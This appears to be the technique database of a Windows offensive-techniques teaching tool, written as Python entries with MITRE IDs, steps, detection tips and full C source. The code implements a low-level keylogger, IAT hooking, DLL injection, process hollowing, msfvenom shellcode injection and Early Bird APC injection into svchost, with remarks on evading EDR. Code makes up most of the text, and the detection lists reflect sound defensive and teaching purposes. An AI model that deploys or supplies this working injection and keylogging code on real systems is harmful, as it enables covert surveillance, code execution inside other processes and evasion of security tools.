"""
Technique database — each entry is a full description with code, steps, and detection info.
"""

CATEGORIES = [
    "All",
    "Process Injection",
    "Hooking",
    "Thread Manipulation",
    "Advanced Evasion",
    "Persistence",
    "Credential Access",
]

TECHNIQUES = [
    # ─────────────────────────────────────────────────────────────────────────
    # HOOKING
    # ─────────────────────────────────────────────────────────────────────────
    {
        "id": "keylogger_hookex",
        "name": "Keylogger via SetWindowsHookEx",
        "category": "Hooking",
        "difficulty": "Intermediate",
        "platform": "Windows",
        "mitre_attack": "T1056.001",
        "tags": ["keylogger", "hook", "WH_KEYBOARD_LL", "monitoring"],
        "short_desc": "Intercepts system-wide keystrokes using a low-level Windows keyboard hook.",
        "description": (
            "SetWindowsHookEx with WH_KEYBOARD_LL installs a low-level keyboard hook that fires before "
            "any application receives the keystroke. Unlike older WH_KEYBOARD hooks, the LL variant does "
            "NOT require injecting a DLL into every process — the callback runs in the hooking process's "
            "thread, making it much stealthier and simpler.\n\n"
            "The hook intercepts WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, and WM_SYSKEYUP messages for the "
            "entire desktop session. It receives a KBDLLHOOKSTRUCT containing the virtual key code, scan "
            "code, timestamp, and extra info. The callback can log, modify, or suppress any keystroke.\n\n"
            "A message pump (GetMessage loop) is mandatory — without it, Windows will remove the hook "
            "after ~5 seconds via a timeout mechanism. This is why keyloggers commonly masquerade as "
            "legitimate apps with hidden windows."
        ),
        "how_it_works": [
            "Call SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hModule, 0) — the thread ID 0 installs a global hook.",
            "Windows registers the hook in the system-wide hook chain for WH_KEYBOARD_LL.",
            "On any keypress, the OS calls your LowLevelKeyboardProc with nCode=HC_ACTION.",
            "Cast lParam to KBDLLHOOKSTRUCT* to read vkCode (virtual key), scanCode, flags, and timestamp.",
            "Check wParam for WM_KEYDOWN / WM_SYSKEYDOWN to distinguish key-down events.",
            "Optionally call GetKeyNameTextA with the scan code to get a human-readable key name.",
            "Always call CallNextHookEx() to pass the event to the next hook (omitting this blocks input).",
            "Run GetMessage / DispatchMessage in a loop to keep the hook alive.",
            "Uninstall with UnhookWindowsHookEx(hHook) when done.",
        ],
        "code_example": r"""#include <windows.h>
#include <stdio.h>

HHOOK  g_hHook   = NULL;
FILE  *g_logFile = NULL;

// Virtual-key to printable string mapping (partial)
static const char *VkToName(DWORD vk) {
    switch (vk) {
        case VK_RETURN:  return "[ENTER]";
        case VK_SPACE:   return "[SPACE]";
        case VK_BACK:    return "[BKSP]";
        case VK_TAB:     return "[TAB]";
        case VK_SHIFT:   return "[SHIFT]";
        case VK_CONTROL: return "[CTRL]";
        case VK_MENU:    return "[ALT]";
        case VK_ESCAPE:  return "[ESC]";
        case VK_DELETE:  return "[DEL]";
        default:         return NULL;
    }
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            const char *name = VkToName(kbd->vkCode);
            char buf[64];

            if (name) {
                snprintf(buf, sizeof(buf), "%s", name);
            } else if (kbd->vkCode >= 0x20 && kbd->vkCode < 0x7F) {
                // Printable ASCII range
                snprintf(buf, sizeof(buf), "%c", (char)kbd->vkCode);
            } else {
                snprintf(buf, sizeof(buf), "[VK:0x%02X]", kbd->vkCode);
            }

            printf("[+] Key captured: %s  (scan=0x%02X)\n", buf, kbd->scanCode);

            if (g_logFile) {
                fprintf(g_logFile, "%s", buf);
                fflush(g_logFile);
            }
        }
    }

    // MUST call next hook — omitting this silently drops keystrokes
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

int main(void) {
    g_logFile = fopen("keylog.txt", "a");

    // Thread ID = 0  →  global hook (all threads on desktop)
    g_hHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        LowLevelKeyboardProc,
        GetModuleHandle(NULL),
        0
    );

    if (!g_hHook) {
        fprintf(stderr, "[-] SetWindowsHookEx failed: %lu\n", GetLastError());
        return 1;
    }

    printf("[*] Hook installed (HHOOK = %p). Waiting for keystrokes...\n", g_hHook);

    // Message pump keeps hook alive and dispatches callbacks
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(g_hHook);
    if (g_logFile) fclose(g_logFile);
    printf("[*] Hook removed. Exiting.\n");
    return 0;
}
""",
        "code_language": "c",
        "detection": [
            "Monitor SetWindowsHookEx calls where idHook == WH_KEYBOARD_LL (13) via ETW or API hooks.",
            "Check the system hook list with EnumWindows / GetWindowLongPtr — hidden windows with hooks are suspicious.",
            "Use Process Monitor to spot processes that have no visible window yet maintain a message pump.",
            "Kernel callbacks: PsSetLoadImageNotifyRoutine can alert when suspicious DLLs load into processes.",
            "Behavioral: a process that never receives focus but writes to files or network after keypress timing is a red flag.",
            "EDR behavioral rules: correlate keyboard-hook registration with file-write or network-send within seconds.",
            "Windows Defender / AV heuristic: low-level hooks in processes with no known UI are flagged.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Type in the input box below. The simulation captures each keystroke using Python "
            "key bindings and displays it exactly as a real keylogger hook callback would receive it — "
            "showing the virtual key code and key name side by side."
        ),
    },

    {
        "id": "iat_hooking",
        "name": "IAT Hooking",
        "category": "Hooking",
        "difficulty": "Intermediate",
        "platform": "Windows",
        "mitre_attack": "T1574.012",
        "tags": ["IAT", "hook", "PE", "API redirect"],
        "short_desc": "Overwrites Import Address Table entries to redirect API calls to custom code.",
        "description": (
            "Every PE (Portable Executable) that imports functions from DLLs contains an Import Address "
            "Table (IAT). At load time, the Windows loader resolves each imported symbol and writes its "
            "actual runtime address into this table. When the executable calls an imported function, the "
            "CPU indirects through the IAT entry.\n\n"
            "IAT hooking replaces one or more of these addresses with a pointer to attacker-controlled "
            "code. All calls to the hooked function from that module are silently redirected — the "
            "attacker's handler runs first, then optionally calls the real function.\n\n"
            "This is used for API monitoring, credential theft (hooking CryptProtectData, "
            "BCryptEncrypt), browser injection, and sandbox evasion. It is module-local: only the "
            "process whose IAT is modified is affected."
        ),
        "how_it_works": [
            "Parse the target process's PE header: IMAGE_DOS_HEADER → IMAGE_NT_HEADERS → IMAGE_IMPORT_DESCRIPTOR.",
            "Walk the import descriptor array to find the DLL whose function you want to hook (e.g., WS2_32.dll).",
            "For each import descriptor, walk the OriginalFirstThunk (INT) to find the desired function name or ordinal.",
            "Locate the corresponding entry in FirstThunk (IAT) — this holds the live address written by the loader.",
            "Use VirtualProtect to make the IAT page writable (it is PAGE_READONLY by default).",
            "Overwrite the IAT entry with the address of your hook function.",
            "Restore page protection with VirtualProtect.",
            "Your hook fires on every subsequent call to that function from this module.",
            "Optionally store the original address so the hook can call-through to the real function.",
        ],
        "code_example": r"""#include <windows.h>
#include <stdio.h>

// ── Original function pointer (call-through) ────────────────────────────────
typedef int (WSAAPI *PFN_CONNECT)(SOCKET, const struct sockaddr *, int);
static PFN_CONNECT g_origConnect = NULL;

// ── Replacement hook ─────────────────────────────────────────────────────────
int WSAAPI Hook_connect(SOCKET s, const struct sockaddr *name, int namelen) {
    struct sockaddr_in *in4 = (struct sockaddr_in *)name;
    printf("[IAT HOOK] connect() → %d.%d.%d.%d:%d\n",
           in4->sin_addr.S_un.S_un_b.s_b1,
           in4->sin_addr.S_un.S_un_b.s_b2,
           in4->sin_addr.S_un.S_un_b.s_b3,
           in4->sin_addr.S_un.S_un_b.s_b4,
           ntohs(in4->sin_port));

    return g_origConnect(s, name, namelen);   // call-through
}

// ── IAT patcher ──────────────────────────────────────────────────────────────
BOOL PatchIAT(HMODULE hMod, const char *dllName, const char *funcName,
              void *hookFn, void **ppOrig)
{
    BYTE *base   = (BYTE *)hMod;
    IMAGE_DOS_HEADER   *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS   *nt  = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_IMPORT_DESCRIPTOR *imp = (IMAGE_IMPORT_DESCRIPTOR *)(base +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    for (; imp->Name; imp++) {
        if (_stricmp((char *)(base + imp->Name), dllName) != 0) continue;

        IMAGE_THUNK_DATA *orig = (IMAGE_THUNK_DATA *)(base + imp->OriginalFirstThunk);
        IMAGE_THUNK_DATA *iat  = (IMAGE_THUNK_DATA *)(base + imp->FirstThunk);

        for (; orig->u1.Function; orig++, iat++) {
            if (IMAGE_SNAP_BY_ORDINAL(orig->u1.Ordinal)) continue;

            IMAGE_IMPORT_BY_NAME *byName =
                (IMAGE_IMPORT_BY_NAME *)(base + orig->u1.AddressOfData);

            if (_stricmp((char *)byName->Name, funcName) != 0) continue;

            // Found — make page writable, swap, restore
            DWORD old;
            VirtualProtect(&iat->u1.Function, sizeof(void *), PAGE_READWRITE, &old);
            *ppOrig = (void *)iat->u1.Function;
            iat->u1.Function = (ULONG_PTR)hookFn;
            VirtualProtect(&iat->u1.Function, sizeof(void *), old, &old);

            printf("[+] IAT patched: %s!%s  old=%p  new=%p\n",
                   dllName, funcName, *ppOrig, hookFn);
            return TRUE;
        }
    }
    return FALSE;
}

// ── Entry point ──────────────────────────────────────────────────────────────
int main(void) {
    // Hook WS2_32.connect in the current module
    BOOL ok = PatchIAT(GetModuleHandle(NULL),
                       "WS2_32.dll", "connect",
                       Hook_connect, (void **)&g_origConnect);

    if (!ok) { puts("[-] Patch failed"); return 1; }

    puts("[*] IAT hooked. All outbound TCP connections will be logged.");
    // ... rest of program proceeds normally; every connect() call is intercepted
    return 0;
}
""",
        "code_language": "c",
        "detection": [
            "Scan loaded module IATs and compare against the disk image — mismatches reveal patched entries.",
            "EDR integrity checks: periodically validate IAT entries against the original loader values.",
            "Memory forensics tools (Volatility, PE-sieve) detect IAT anomalies in running processes.",
            "PAGE_READWRITE transitions on the IAT section (normally PAGE_READONLY) are suspicious.",
            "API monitor / ETW: VirtualProtect calls targeting image sections outside normal loader activity.",
        ],
        "has_simulation": True,
        "sim_description": (
            "The simulation walks a mock PE import table and shows how each entry is "
            "resolved, then demonstrates patching one entry and routing through the hook."
        ),
    },

    # ─────────────────────────────────────────────────────────────────────────
    # PROCESS INJECTION
    # ─────────────────────────────────────────────────────────────────────────
    {
        "id": "classic_dll_injection",
        "name": "Classic DLL Injection (CreateRemoteThread)",
        "category": "Process Injection",
        "difficulty": "Beginner",
        "platform": "Windows",
        "mitre_attack": "T1055.001",
        "tags": ["DLL", "CreateRemoteThread", "LoadLibrary", "injection"],
        "short_desc": "Forces a remote process to load an attacker-controlled DLL via CreateRemoteThread + LoadLibrary.",
        "description": (
            "Classic DLL injection is the most documented and widely understood process injection "
            "technique. It exploits the fact that LoadLibraryA/W is exported at a fixed offset from "
            "kernel32.dll's base address, which is the same across all processes in the same OS session.\n\n"
            "The injector writes the DLL path into the target process's virtual memory, then creates a "
            "remote thread that begins executing at LoadLibraryA. The OS loader in the target process "
            "then maps and initializes the DLL normally — including running DllMain with DLL_PROCESS_ATTACH.\n\n"
            "This technique is straightforward but noisy. It requires OpenProcess with high privileges "
            "(PROCESS_VM_WRITE, PROCESS_VM_OPERATION, PROCESS_CREATE_THREAD), leaves the DLL visible "
            "in the PEB's module list, and is detected by virtually all modern EDRs."
        ),
        "how_it_works": [
            "OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID) to get a handle to the victim process.",
            "VirtualAllocEx(hProc, NULL, pathLen, MEM_COMMIT, PAGE_READWRITE) to allocate memory in the target.",
            "WriteProcessMemory(hProc, remoteAddr, dllPath, pathLen, NULL) to copy the DLL path string.",
            "GetProcAddress(GetModuleHandleA('kernel32.dll'), 'LoadLibraryA') to get the LoadLibrary address — same in all processes.",
            "CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibAddr, remoteAddr, 0, NULL) creates a thread in the target.",
            "The thread starts at LoadLibraryA with the remote DLL path as its argument.",
            "Windows loader in target process maps the DLL and calls DllMain(DLL_PROCESS_ATTACH).",
            "Your DLL payload runs inside the target process's address space.",
            "WaitForSingleObject + CloseHandle to clean up the thread handle.",
        ],
        "code_example": r"""#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// ── Find PID by process name ──────────────────────────────────────────────────
DWORD FindPID(const wchar_t *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };

    for (BOOL ok = Process32FirstW(snap, &pe); ok; ok = Process32NextW(snap, &pe))
        if (!_wcsicmp(pe.szExeFile, name)) { CloseHandle(snap); return pe.th32ProcessID; }

    CloseHandle(snap);
    return 0;
}

// ── Inject DLL into target PID ────────────────────────────────────────────────
BOOL InjectDLL(DWORD pid, const char *dllPath) {
    SIZE_T pathLen = strlen(dllPath) + 1;

    HANDLE hProc = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
        FALSE, pid);

    if (!hProc) { printf("[-] OpenProcess failed: %lu\n", GetLastError()); return FALSE; }

    // 1. Allocate memory for the DLL path in the remote process
    LPVOID remoteStr = VirtualAllocEx(hProc, NULL, pathLen,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteStr) { CloseHandle(hProc); return FALSE; }

    // 2. Write the DLL path string
    WriteProcessMemory(hProc, remoteStr, dllPath, pathLen, NULL);

    // 3. Get LoadLibraryA address — identical in all processes for the same session
    LPVOID loadLib = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

    // 4. Create remote thread at LoadLibraryA with path as argument
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
                                         (LPTHREAD_START_ROUTINE)loadLib,
                                         remoteStr, 0, NULL);

    if (!hThread) {
        printf("[-] CreateRemoteThread failed: %lu\n", GetLastError());
        VirtualFreeEx(hProc, remoteStr, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }

    printf("[+] Remote thread created (TID=%lu). Waiting for DLL load...\n",
           GetThreadId(hThread));

    WaitForSingleObject(hThread, 5000);

    // Cleanup remote allocation
    VirtualFreeEx(hProc, remoteStr, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return TRUE;
}

int main(void) {
    DWORD pid = FindPID(L"notepad.exe");
    if (!pid) { puts("[-] notepad.exe not found"); return 1; }

    printf("[*] Target PID: %lu\n", pid);
    InjectDLL(pid, "C:\\payload.dll");
    return 0;
}
""",
        "code_language": "c",
        "detection": [
            "OpenProcess with PROCESS_CREATE_THREAD | PROCESS_VM_WRITE is a high-confidence injection indicator.",
            "VirtualAllocEx → WriteProcessMemory → CreateRemoteThread sequence in a single process is a classic 3-step signature.",
            "Remote thread whose start address equals kernel32!LoadLibraryA is directly flagged by most EDRs.",
            "PEB module list inspection: unexpected DLLs loaded by svchost.exe, explorer.exe, etc.",
            "Thread start addresses that don't point to the start of a mapped module section are suspicious.",
            "ETW Microsoft-Windows-Kernel-Process events: remote thread creation events.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Step-by-step visual walkthrough: watch each API call light up in sequence, "
            "with a live memory map showing the remote allocation and thread creation."
        ),
    },

    {
        "id": "process_hollowing",
        "name": "Process Hollowing",
        "category": "Process Injection",
        "difficulty": "Advanced",
        "platform": "Windows",
        "mitre_attack": "T1055.012",
        "tags": ["hollowing", "process doppelganger", "NtUnmapViewOfSection", "PE"],
        "short_desc": "Spawns a legitimate process suspended, unmaps its code, and replaces it with a malicious PE image.",
        "description": (
            "Process hollowing (also called RunPE) creates a new process in SUSPENDED state from a "
            "legitimate executable. It then unmaps the legitimate executable's code section from memory "
            "and replaces it with the attacker's PE image. When the process is resumed, it executes the "
            "attacker's code under the identity of the legitimate process.\n\n"
            "This is highly effective for EDR bypass because: the process name, path, and parent PID all "
            "appear legitimate; the PEB still shows the original executable path; and process-based "
            "allowlisting is bypassed entirely.\n\n"
            "The technique requires precise PE parsing and manual relocation of the injected image if its "
            "base address differs from its preferred load address. Modern variants (Process Doppelgänging, "
            "Herpaderping) extend this with transactional NTFS or file manipulation to further evade "
            "file-based scanning."
        ),
        "how_it_works": [
            "CreateProcess(targetPath, ..., CREATE_SUSPENDED) spawns svchost.exe (or similar) in suspended state.",
            "GetThreadContext(hThread, &ctx) reads the main thread's context — EAX/RAX holds the entry point.",
            "Read PEB base from ctx.Ebx/Rdx (32-bit) or ctx.Rdx (64-bit); read PEB.ImageBaseAddress.",
            "NtUnmapViewOfSection(hProc, imageBase) unmaps the legitimate executable's image from the process.",
            "VirtualAllocEx at the preferred base address of your PE to reserve space for the new image.",
            "WriteProcessMemory to copy the PE headers and each section (.text, .data, .rsrc …) individually.",
            "Fix the PEB.ImageBaseAddress pointer to point to your newly mapped image.",
            "If base addresses differ, apply relocation patches (IMAGE_BASE_RELOCATION blocks).",
            "SetThreadContext to update the entry point (EIP/RIP) to your PE's AddressOfEntryPoint.",
            "ResumeThread — the legitimate-looking process now runs your payload.",
        ],
        "code_example": r"""// Simplified 64-bit Process Hollowing skeleton
// Full implementation requires PE parsing and reloc patching.
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

typedef NTSTATUS (NTAPI *PFN_NtUnmapViewOfSection)(HANDLE, PVOID);

// Read raw PE bytes from disk (or memory/network)
PBYTE LoadPayloadPE(const char *path, SIZE_T *size);

BOOL HollowProcess(const wchar_t *hostPath, PBYTE payload, SIZE_T payloadSize) {
    STARTUPINFOW si = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi = {0};

    // 1. Spawn host process SUSPENDED
    if (!CreateProcessW(hostPath, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess failed: %lu\n", GetLastError());
        return FALSE;
    }
    printf("[+] Spawned PID=%lu  TID=%lu (suspended)\n", pi.dwProcessId, pi.dwThreadId);

    // 2. Read thread context to locate PEB
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    GetThreadContext(pi.hThread, &ctx);

    // 3. Read PEB.ImageBaseAddress (Rdx points to PEB in 64-bit)
    ULONGLONG pebBase, imageBase;
    ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Rdx), &pebBase, 8, NULL);
    ReadProcessMemory(pi.hProcess, (LPCVOID)(pebBase + 0x10), &imageBase, 8, NULL);
    printf("[+] PEB @ 0x%llX  |  ImageBase @ 0x%llX\n", pebBase, imageBase);

    // 4. Unmap the legitimate image
    PFN_NtUnmapViewOfSection NtUnmap =
        (PFN_NtUnmapViewOfSection)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    NtUnmap(pi.hProcess, (PVOID)imageBase);

    // 5. Parse payload PE headers
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(payload + dos->e_lfanew);
    ULONGLONG prefBase    = nt->OptionalHeader.ImageBase;
    SIZE_T    imageSize   = nt->OptionalHeader.SizeOfImage;

    // 6. Allocate memory at preferred base
    LPVOID remote = VirtualAllocEx(pi.hProcess, (LPVOID)prefBase, imageSize,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) remote = VirtualAllocEx(pi.hProcess, NULL, imageSize,
                                          MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("[+] Remote allocation @ %p\n", remote);

    // 7. Write PE headers
    WriteProcessMemory(pi.hProcess, remote, payload,
                       nt->OptionalHeader.SizeOfHeaders, NULL);

    // 8. Write each section
    PIMAGE_SECTION_HEADER sec =
        (PIMAGE_SECTION_HEADER)((BYTE *)nt + sizeof(IMAGE_NT_HEADERS));
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        WriteProcessMemory(pi.hProcess,
            (BYTE *)remote + sec->VirtualAddress,
            payload + sec->PointerToRawData,
            sec->SizeOfRawData, NULL);
    }

    // 9. Fix PEB.ImageBaseAddress
    WriteProcessMemory(pi.hProcess, (LPVOID)(pebBase + 0x10),
                       &remote, sizeof(ULONGLONG), NULL);

    // 10. Update entry point and resume
    ctx.Rcx = (ULONGLONG)remote + nt->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);
    printf("[+] Entry point set to 0x%llX. Resuming...\n", ctx.Rcx);
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}
""",
        "code_language": "c",
        "detection": [
            "NtUnmapViewOfSection called on a process the caller just spawned is a high-confidence signal.",
            "Discrepancy between PEB.ImageBaseAddress and the on-disk PE path is a strong indicator.",
            "Thread entry point (from GetThreadContext) not within any mapped module's address range.",
            "Scanning memory regions for PE magic bytes (MZ/PE) that are not backed by a file on disk.",
            "CreateProcess(CREATE_SUSPENDED) followed immediately by cross-process memory writes is suspicious.",
            "Tools: Hollows Hunter, pe-sieve scan running processes for hollow/implanted modules.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Step-by-step animated walkthrough: each phase highlights in the code view "
            "and a live ASCII memory diagram shows the before/after state of the process address space."
        ),
    },

    {
        "id": "shellcode_injection",
        "name": "Shellcode Injection (VirtualAllocEx)",
        "category": "Process Injection",
        "difficulty": "Beginner",
        "platform": "Windows",
        "mitre_attack": "T1055",
        "tags": ["shellcode", "VirtualAllocEx", "WriteProcessMemory", "RWX"],
        "short_desc": "Allocates RWX memory in a remote process and writes raw shellcode for execution.",
        "description": (
            "The most primitive form of process injection: allocate executable memory in a target process, "
            "copy shellcode bytes into it, and redirect execution there. Unlike DLL injection, there is no "
            "PE structure — just raw machine code.\n\n"
            "Shellcode is typically produced by exploit frameworks (Cobalt Strike, msfvenom) or hand-written "
            "in assembly. It must be position-independent (PIC) since its load address is not known at "
            "compile time. Common payloads include reverse shells, stagers, or in-memory loaders.\n\n"
            "The PAGE_EXECUTE_READWRITE (RWX) allocation is the classic indicator — legitimate code almost "
            "never needs memory that is simultaneously writable and executable. Modern variants use a two-step "
            "approach: allocate PAGE_READWRITE, write, then VirtualProtectEx to PAGE_EXECUTE_READ."
        ),
        "how_it_works": [
            "Obtain a shellcode payload — either generated by a framework or custom-written assembly.",
            "OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid) to get a handle to the target.",
            "VirtualAllocEx(hProc, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE) — allocate RWX memory.",
            "WriteProcessMemory(hProc, remoteAddr, shellcode, shellcodeSize, NULL) to copy bytes.",
            "(Better OPSEC) VirtualProtectEx to change permissions from RW to RX before executing.",
            "CreateRemoteThread / NtCreateThreadEx / RtlCreateUserThread to start execution at remoteAddr.",
            "The target process's thread now executes your shellcode natively.",
        ],
        "code_example": r"""#include <windows.h>
#include <stdio.h>

// Example: calc.exe popup shellcode (x64, Windows 10)
// Generated with: msfvenom -p windows/x64/exec CMD=calc.exe -f c
unsigned char shellcode[] = {
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
    /* ... truncated for brevity ... */
    0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};

BOOL InjectShellcode(DWORD pid, PBYTE sc, SIZE_T scLen) {
    HANDLE hProc = OpenProcess(
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
        FALSE, pid);

    if (!hProc) return FALSE;

    // 1. Allocate RW memory (two-step is stealthier than RWX)
    LPVOID remote = VirtualAllocEx(hProc, NULL, scLen,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) { CloseHandle(hProc); return FALSE; }

    // 2. Write shellcode bytes
    WriteProcessMemory(hProc, remote, sc, scLen, NULL);

    // 3. Flip to RX — eliminates the RWX memory indicator
    DWORD old;
    VirtualProtectEx(hProc, remote, scLen, PAGE_EXECUTE_READ, &old);

    // 4. Execute via remote thread
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
                                         (LPTHREAD_START_ROUTINE)remote,
                                         NULL, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }

    printf("[+] Shellcode executing in PID=%lu at %p\n", pid, remote);
    WaitForSingleObject(hThread, 5000);

    CloseHandle(hThread);
    CloseHandle(hProc);
    return TRUE;
}

int main(void) {
    DWORD targetPid = 1234;  // replace with target PID
    return InjectShellcode(targetPid, shellcode, sizeof(shellcode)) ? 0 : 1;
}
""",
        "code_language": "c",
        "detection": [
            "PAGE_EXECUTE_READWRITE allocations in remote processes are nearly always malicious.",
            "VirtualAllocEx + WriteProcessMemory + CreateRemoteThread within the same process flow.",
            "Memory regions that are executable but not backed by a file (anonymous executable pages).",
            "Thread start address points into an anonymous (non-module) memory region.",
            "Scan for shellcode patterns: common stubs like PEB-walk, hash-based API resolution.",
            "EDR memory scanning: scan remote process memory after allocation events.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Demonstrates the allocation sequence: shows a real VirtualAlloc call in the current process, "
            "displays the returned address and page permissions, then frees it — no execution occurs."
        ),
    },

    # ─────────────────────────────────────────────────────────────────────────
    # THREAD MANIPULATION
    # ─────────────────────────────────────────────────────────────────────────
    {
        "id": "apc_injection",
        "name": "APC Queue Injection (Early Bird)",
        "category": "Thread Manipulation",
        "difficulty": "Advanced",
        "platform": "Windows",
        "mitre_attack": "T1055.004",
        "tags": ["APC", "QueueUserAPC", "Early Bird", "alertable", "thread"],
        "short_desc": "Queues an Asynchronous Procedure Call to a target thread to execute shellcode when the thread enters an alertable wait.",
        "description": (
            "APC (Asynchronous Procedure Call) injection abuses the Windows APC mechanism — a way to "
            "schedule functions to run on a specific thread. When a thread enters an alertable wait "
            "(SleepEx, WaitForSingleObjectEx, MsgWaitForMultipleObjectsEx, etc.), the OS drains its "
            "APC queue and executes each queued function.\n\n"
            "The 'Early Bird' variant is particularly potent: spawn a process in SUSPENDED state, "
            "inject shellcode, queue an APC to the main thread BEFORE it has even initialized, then "
            "resume. The first alertable wait the thread hits — often inside ntdll initialization — "
            "detonates the payload before any EDR hooks are loaded.\n\n"
            "Unlike CreateRemoteThread, QueueUserAPC does not create a new thread (lower overhead, "
            "less visibility) and the execution happens on an existing, legitimate thread."
        ),
        "how_it_works": [
            "CreateProcess(hostPath, ..., CREATE_SUSPENDED) — spawn a legitimate process suspended.",
            "VirtualAllocEx + WriteProcessMemory to plant shellcode in the suspended process.",
            "OpenThread(THREAD_SET_CONTEXT, FALSE, targetTid) to get a handle to the target thread.",
            "QueueUserAPC((PAPCFUNC)shellcodeAddr, hThread, 0) — add the APC to the thread's queue.",
            "ResumeThread(hThread) — the process starts initializing.",
            "At the first alertable wait inside ntdll startup code, the APC fires and shellcode runs.",
            "The shellcode executes on the host process's main thread — no foreign thread visible.",
        ],
        "code_example": r"""#include <windows.h>
#include <stdio.h>

// Shellcode placeholder (replace with your payload)
unsigned char sc[] = { 0x90, 0x90, 0xC3 };  // NOP NOP RET — safe test stub

BOOL EarlyBirdAPC(const wchar_t *hostExe, PBYTE sc, SIZE_T scLen) {
    STARTUPINFOW si        = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi = {0};

    // 1. Spawn host suspended
    if (!CreateProcessW(hostExe, NULL, NULL, NULL, FALSE,
                         CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess: %lu\n", GetLastError());
        return FALSE;
    }
    printf("[+] PID=%lu TID=%lu (suspended)\n", pi.dwProcessId, pi.dwThreadId);

    // 2. Allocate + write shellcode
    LPVOID remote = VirtualAllocEx(pi.hProcess, NULL, scLen,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, remote, sc, scLen, NULL);
    printf("[+] Shellcode written @ %p\n", remote);

    // 3. Queue APC to main thread — fires on first alertable wait
    DWORD ret = QueueUserAPC((PAPCFUNC)remote, pi.hThread, 0);
    if (!ret) {
        printf("[-] QueueUserAPC failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }
    printf("[+] APC queued. Resuming thread...\n");

    // 4. Resume — APC fires during ntdll initialization
    ResumeThread(pi.hThread);

    WaitForSingleObject(pi.hProcess, 5000);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}

int main(void) {
    return EarlyBirdAPC(L"C:\\Windows\\System32\\svchost.exe",
                         sc, sizeof(sc)) ? 0 : 1;
}
""",
        "code_language": "c",
        "detection": [
            "QueueUserAPC targeting a thread in another process is unusual and should be logged.",
            "APC target address falls in anonymous (non-module-backed) memory — strong indicator.",
            "CREATE_SUSPENDED followed by VirtualAllocEx + QueueUserAPC + ResumeThread sequence.",
            "ETW: Microsoft-Windows-Kernel-Process APC events surfaced by some EDRs.",
            "Memory scanning for shellcode stubs in new processes during their initialization window.",
            "Process creation with CREATE_SUSPENDED from unexpected parents is a workflow anomaly.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Visual walkthrough animating the Early Bird sequence step by step, "
            "with an APC queue diagram that shows the queued item being dequeued and fired."
        ),
    },

    {
        "id": "thread_hijacking",
        "name": "Thread Hijacking (Context Manipulation)",
        "category": "Thread Manipulation",
